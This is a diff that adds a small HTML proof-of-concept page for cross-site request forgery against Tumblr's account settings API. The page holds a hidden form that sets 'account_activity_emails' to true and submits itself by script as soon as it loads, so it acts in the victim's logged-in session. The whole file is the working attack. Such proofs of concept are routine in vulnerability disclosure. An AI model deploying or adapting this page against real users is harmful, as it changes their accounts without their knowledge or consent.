@@ -1,0 +1,13 @@
+<!-- CSRF PoC for Tumblr account settings -->
+<html>
+  <body>
+    <form action="https://www.tumblr.com/api/v2/user/settings" method="POST">
+      <input type="hidden" name="account_activity_emails" value="true">
+      <input type="submit" value="Submit CSRF">
+    </form>
+
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
